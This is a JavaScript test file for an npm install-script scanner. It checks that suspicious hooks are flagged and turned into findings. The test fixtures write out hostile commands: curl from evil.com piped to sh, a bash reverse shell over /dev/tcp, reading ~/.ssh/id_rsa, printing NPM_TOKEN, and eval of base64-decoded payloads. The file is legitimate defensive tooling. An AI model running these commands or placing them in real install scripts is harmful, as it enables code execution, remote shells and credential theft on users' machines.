import { describe, it } from 'node:test'
import assert from 'node:assert/strict'
import { analyzeScripts, scriptRisksToFindings } from '../src/script-analysis.js'

describe('analyzeScripts', () => {
  it('returns clean for scripts without install hooks', () => {
    const result = analyzeScripts({ build: 'tsc', test: 'jest' })
    assert.strictEqual(result.suspicious, false)
    assert.strictEqual(result.risks.length, 0)
  })

  it('returns clean for undefined scripts', () => {
    const result = analyzeScripts(undefined)
    assert.strictEqual(result.suspicious, false)
  })

  it('returns clean for legitimate postinstall', () => {
    const result = analyzeScripts({ postinstall: 'node scripts/download-binary.js' })
    assert.strictEqual(result.suspicious, false)
  })

  it('detects curl pipe sh', () => {
    const result = analyzeScripts({ postinstall: 'curl https://evil.com/setup.sh | sh' })
    assert.strictEqual(result.suspicious, true)
    assert.ok(result.risks.some(r => r.severity === 'critical'))
  })

  it('detects environment variable access', () => {
    const result = analyzeScripts({ preinstall: 'node -e "console.log(process.env.NPM_TOKEN)"' })
    assert.strictEqual(result.suspicious, true)
    assert.ok(result.risks.some(r => r.description.includes('environment variables')))
  })

  it('detects reverse shell pattern', () => {
    const result = analyzeScripts({ postinstall: 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1' })
    assert.strictEqual(result.suspicious, true)
    assert.ok(result.risks.some(r => r.severity === 'critical'))
  })

  it('detects ssh key access', () => {
    const result = analyzeScripts({ install: 'cat ~/.ssh/id_rsa' })
    assert.strictEqual(result.suspicious, true)
    assert.ok(result.risks.some(r => r.description.includes('SSH keys')))
  })

  it('detects eval with decoded content', () => {
    const result = analyzeScripts({ postinstall: 'eval(Buffer.from("payload","base64").toString())' })
    assert.strictEqual(result.suspicious, true)
    assert.ok(result.risks.some(r => r.description.includes('obfuscated')))
  })

  it('detects /bin/ssh typosquatting', () => {
    const result = analyzeScripts({ install: '/bin/ssh setup.sh' })
    assert.strictEqual(result.suspicious, true)
    assert.ok(result.risks.some(r => r.description.includes('/bin/ssh')))
  })

  it('ignores non-install scripts', () => {
    const result = analyzeScripts({ build: 'curl https://evil.com | sh', test: 'eval(process.env.SECRET)' })
    assert.strictEqual(result.suspicious, false)
  })
})

describe('scriptRisksToFindings', () => {
  it('returns empty array for clean scripts', () => {
    const analysis = analyzeScripts({ build: 'tsc' })
    const findings = scriptRisksToFindings(analysis)
    assert.strictEqual(findings.length, 0)
  })

  it('converts risks to SecurityFindings with rich metadata', () => {
    const analysis = analyzeScripts({ postinstall: 'curl https://evil.com/setup.sh | sh' })
    const findings = scriptRisksToFindings(analysis)

    assert.ok(findings.length > 0)
    const finding = findings[0]

    // Should have all SecurityFinding fields
    assert.ok(finding.severity, 'Missing severity')
    assert.ok(finding.category, 'Missing category')
    assert.ok(finding.title, 'Missing title')
    assert.ok(finding.explanation.length > 20, 'Explanation should be rich')
    assert.ok(finding.evidence, 'Missing evidence')
    assert.ok(finding.file, 'Missing file')
    assert.ok(finding.recommendation.length > 10, 'Recommendation should be present')
  })

  it('includes script name in title', () => {
    const analysis = analyzeScripts({ preinstall: 'cat ~/.ssh/id_rsa' })
    const findings = scriptRisksToFindings(analysis)

    assert.ok(findings.some(f => f.title.includes('Install script:')))
  })

  it('maps severity correctly', () => {
    const analysis = analyzeScripts({ postinstall: 'curl https://evil.com | sh' })
    const findings = scriptRisksToFindings(analysis)

    // curl|sh is critical
    assert.ok(findings.some(f => f.severity === 'critical'))
  })

  it('maps moderate severity to medium', () => {
    const analysis = analyzeScripts({ postinstall: 'https://some-random-server.com/api' })
    const findings = scriptRisksToFindings(analysis)

    // External URL is moderate → should map to medium
    const urlFinding = findings.find(f => f.title.includes('network request'))
    if (urlFinding) {
      assert.strictEqual(urlFinding.severity, 'medium')
    }
  })

  it('preserves category from pattern rules', () => {
    const analysis = analyzeScripts({ postinstall: 'cat ~/.ssh/id_rsa' })
    const findings = scriptRisksToFindings(analysis)

    assert.ok(findings.some(f => f.category === 'data-exfiltration'))
  })
})
